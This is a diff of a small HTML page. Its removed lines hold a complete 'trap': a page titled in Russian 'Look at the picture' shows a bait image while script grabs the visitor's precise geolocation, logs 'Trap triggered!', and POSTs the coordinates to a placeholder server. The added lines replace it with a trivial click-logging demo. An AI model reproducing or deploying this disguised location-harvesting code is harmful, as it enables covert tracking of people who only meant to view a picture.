@@ -2,42 +2,28 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Посмотри на картинку</title>
+    <title>Title</title>
+    <style>
+        #app{
+            width: 100px;
+            height: 100px;
+            background-color: red;
+        }
+    </style>
 </head>
 <body>
-
-<!-- Картинка -->
-<img src="https://images.unsplash.com/photo-1734279135113-8bd58bc02b69?q=80&w=3048&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
-     alt="Красивая картинка"
-     width="400px">
+<div id="app"></div>
 
 <script>
-    navigator.geolocation.getCurrentPosition(
-        function (position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            let accuracy = position.coords.accuracy;
+    let app = document.getElementById('app');
+    app.onclick = function (ev) {
+        console.log('click');
+        console.log(ev);
+    }
 
-            console.log("Ловушка сработала! 📍");
-            console.log("Широта:", lat);
-            console.log("Долгота:", lon);
-            console.log("Точность:", accuracy, "метров");
 
-            // Отправляем данные на твой сервер или другой компьютер
-            fetch("https://your-server.com/save-location", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: accuracy })
-            });
-        },
-        function (error) {
-            console.log("Ошибка:", error.message);
-        },
-        { enableHighAccuracy: true }
-    );
 </script>
+
 
 </body>
 </html>
-
